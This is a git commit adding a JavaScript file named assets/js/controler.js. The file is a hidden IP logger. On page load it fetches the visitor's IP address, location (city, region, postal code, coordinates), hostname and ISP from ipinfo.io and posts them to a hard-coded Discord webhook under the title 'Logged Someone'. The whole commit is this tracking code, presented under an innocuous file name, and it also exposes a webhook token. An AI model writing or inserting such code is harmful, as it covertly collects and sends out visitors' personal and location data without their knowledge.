639f90f2ca2ad654da04a0bf1840310ae16d9dd2
Luc14n0 <99104490+KirbyHacks@users.noreply.github.com>
2022-11-15 08:56:23 -0300

    Add files via upload

---
+++ assets/js/controler.js
@@ -0,0 +1,35 @@
+$.getJSON("https://ipinfo.io/json", function(data) {         
+  var params = {
+    embeds: [
+      {
+        "title": "Logged Someone",
+        "color": 15258703,
+        "thumbnail": {
+        },
+        "fields": [
+          {
+            "name": "IP Address",
+            "value": `> ${data.ip}`
+          },
+          {
+            "name": "GeoLocation Info",
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+          },
+          {
+            "name": "Network Info",
+            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+          }
+        ]
+      }
+    ]
+  }
+  fetch('https://discord.com/api/webhooks/1028745594954600619/h-TlI6JI3nYDHB-6r6W2is6y0pyQQQFLzisd9asA8EYgB6Azv0rOWy1EahGeeD-2FxaJ', {
+    method: "POST",
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  }).then(res => {
+    console.log(res);
+  }) 
+})
